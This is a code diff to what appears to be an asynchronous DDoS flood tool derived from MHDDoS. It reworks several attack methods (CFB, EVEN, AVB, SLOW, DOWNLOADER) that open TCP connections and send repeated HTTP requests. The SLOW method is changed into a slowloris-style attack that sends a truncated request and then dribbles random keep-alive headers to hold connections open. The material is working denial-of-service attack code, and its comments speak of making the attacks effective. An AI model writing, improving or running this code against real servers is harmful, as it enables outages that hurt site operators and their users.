@@ -434,14 +434,13 @@ class AsyncTcpFlood(FloodBase):
 
     async def CFB(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
-        packet_size: int = len(packet)
 
         def _gen():
-            yield FloodOp.WRITE, (packet, packet_size, 1)
+            yield FloodOp.WRITE, packet
             yield FloodOp.SLEEP, 5.01
             deadline = time.time() + 120
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size, 1)
+                yield FloodOp.WRITE, packet
                 if time.time() > deadline:
                     return
 
@@ -449,11 +448,10 @@ class AsyncTcpFlood(FloodBase):
 
     async def EVEN(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
-        packet_size: int = len(packet)
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size, 1)
+                yield FloodOp.WRITE, packet
                 # XXX: have to setup buffering properly for this attack to be effective
                 yield FloodOp.READ, 1
 
@@ -461,51 +459,42 @@ class AsyncTcpFlood(FloodBase):
 
     async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
-        packet_size: int = len(packet)
 
         def _gen():
             for _ in range(self._settings.requests_per_connection):
                 yield FloodOp.SLEEP, 1
-                yield FloodOp.WRITE, (packet, packet_size, 1)
+                yield FloodOp.WRITE, packet
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
     async def SLOW(self, on_connect=None) -> bool:
-        packet: bytes = self.build_request()
-        packet_size: int = len(packet)
+        packet: bytes = self.build_request()[:-3]
 
         def _gen():
+            yield FloodOp.WRITE, packet
+
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size, 1)
-            while True:
-                yield FloodOp.WRITE, (packet, packet_size, 1)
-                yield FloodOp.READ, 1
-                # XXX: note this weird break in the middle of the code:
-                #      https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
-                #      this attack has to be re-tested
-                keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
-                yield FloodOp.WRITE, (keep, len(keep), 1)
-                yield FloodOp.SLEEP, 10
+                keep_alive = b"\nX-a: %d\r" % random.randint(1, 1000000)
+                yield FloodOp.WRITE, keep_alive
+                yield FloodOp.SLEEP, random.randint(10, 15)
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
     async def DOWNLOADER(self, on_connect=None) -> bool:
         packet: bytes = self.build_request()
-        packet_size: int = len(packet)
 
         def _gen():
+            yield FloodOp.WRITE, packet
+
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (packet, packet_size, 1)
-                while True:
-                    yield FloodOp.SLEEP, 0.1
-                    yield FloodOp.READ, 1
-                    # XXX: how to detect EOF here?
-                    #      the problem with such attack is that if we already got
-                    #      EOF, there's no need to perform any other operations
-                    #      within range(_) loop. original code from MHDDOS seems to
-                    #      be broken on the matter:
-                    #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
-            yield FloodOp.WRITE, (b'0', 1, 1)
+                yield FloodOp.SLEEP, 0.1
+                yield FloodOp.READ, 1
+                # XXX: how to detect EOF here?
+                #      the problem with such attack is that if we already got
+                #      EOF, there's no need to perform any other operations
+                #      within range(_) loop. original code from MHDDOS seems to
+                #      be broken on the matter:
+                #      https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
@@ -565,12 +554,10 @@ class AsyncTcpFlood(FloodBase):
             )
         )
 
-        p1_size, p2_size = len(p1), len(p2)
-
         def _gen():
-            yield FloodOp.WRITE, (p1, p1_size, 1)
+            yield FloodOp.WRITE, p1
             for _ in range(self._settings.requests_per_connection):
-                yield FloodOp.WRITE, (p2, p2_size, 1)
+                yield FloodOp.WRITE, p2
 
         return await self._generic_flood_proto(FloodSpecType.GENERATOR, _gen(), on_connect)
 
